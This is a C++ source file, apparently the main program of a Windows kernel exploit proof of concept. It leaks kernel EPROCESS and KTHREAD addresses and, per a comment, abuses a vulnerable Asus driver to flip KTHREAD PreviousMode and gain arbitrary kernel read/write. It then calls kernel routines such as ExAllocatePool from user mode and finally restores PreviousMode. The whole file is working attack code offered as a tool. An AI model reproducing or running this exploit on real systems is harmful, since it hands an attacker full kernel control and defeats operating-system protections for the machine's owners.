#include <Windows.h>
#include <iostream>
#include <string>
#include <winternl.h>
#include <stdint.h>
#include <vector>
#include <psapi.h>
#include <ntstatus.h>

#pragma comment(lib, "ntdll.lib")

#include "ntdefs.h"
#include "utils.h"
#include "mem.h"
#include "bustercall.h"

int main()
{
    //
    // Leak System _EPROCESS kernel address
    // 
    uintptr_t SystemEProcess = GetKernelObject(4, (HANDLE)4);
    if (!SystemEProcess)
        return false;

    printf("[+] System EProcess: %p\n", (void*)SystemEProcess);

    //
    // Leak current _KTHREAD kernel address
    //
    uintptr_t CurrentKThread = GetCurrentKThread();
    if (!CurrentKThread)
        return false;

    printf("[+] Current KThread: %p\n", (void*)CurrentKThread);

    //
    // Leak current _EPROCESS kernel address
    //
    uintptr_t CurrentEProcess = GetCurrentEProcess();
    if (!CurrentEProcess)
        return false;

    printf("[+] Current EPROCESS: %p\n", (void*)CurrentEProcess);

    //
	// Abusing a Asus driver i found to get arbitrary kernel read/writes
    //
    if (!ElevateThread(CurrentKThread))
    {
        return false;
    }

    printf("[!] Obtained arbitrary kernel read/writes\n");

    //
    // Initialize page table base - try multiple approaches
    //
    printf("[*] Initializing page table base...\n");
   

	// Initialize buster caller
	if (!InitializeBusterCaller()) {
		printf("[-] Failed to initialize buster caller\n");
	}
	else {
		// Call DbgPrint
		printf("\n[*] Calling DbgPrint\n");
		const char* Message1 = "[BusterCall] Hello from kernel!\n";
		NTSTATUS Result1 = CallKernelFunction<NTSTATUS>("DbgPrint", Message1);
		printf("[+] DbgPrint returned: 0x%x\n", Result1);

		// Call DbgPrintEx
		printf("[*] Calling DbgPrintEx\nn");
		const char* Message2 = "[BusterCall] Hello from kernel!\n";
		ULONG ComponentId = 0;  // DPFLTR_DEFAULT_ID
		ULONG Level = 0;        // DPFLTR_ERROR_LEVEL
		NTSTATUS Result2 = CallKernelFunction<NTSTATUS>("DbgPrintEx", ComponentId, Level, Message2);
		printf("[+] DbgPrintEx returned: 0x%x\n", Result2);

        // Call ExAllocatePool
        printf("\n[*] Calling ExAllocatePool\n");
        auto AllocatedPool = CallKernelFunction<PVOID, POOL_TYPE, SIZE_T>("ExAllocatePool", NonPagedPool, 0x1000);
        printf("Allocated kernel memory: 0x%llx\n", AllocatedPool);

        // Call ZwClose with invalid handle
        printf("\n[*] Calling ZwClose\n");
        HANDLE TestHandle = (HANDLE)0xDEADBEEF;
        NTSTATUS Result3 = CallKernelFunction<NTSTATUS>("ZwClose", TestHandle);
        printf("[+] ZwClose returned: 0x%x (expected: 0xC0000008 = STATUS_INVALID_HANDLE)\n", Result3);

        //g_KernelCaller->PatchNtAddAtomTest();

	}


    //
    // Restoring KTHREAD->PreviousMode
    //
    char mode = 1;
    WriteKernelMemory(reinterpret_cast<PVOID>(CurrentKThread + KTHREAD_PreviousMode), reinterpret_cast<PVOID>(mode), sizeof(char));

    printf("[+] Press any key to exit...\n");

    getchar();

    return true;
}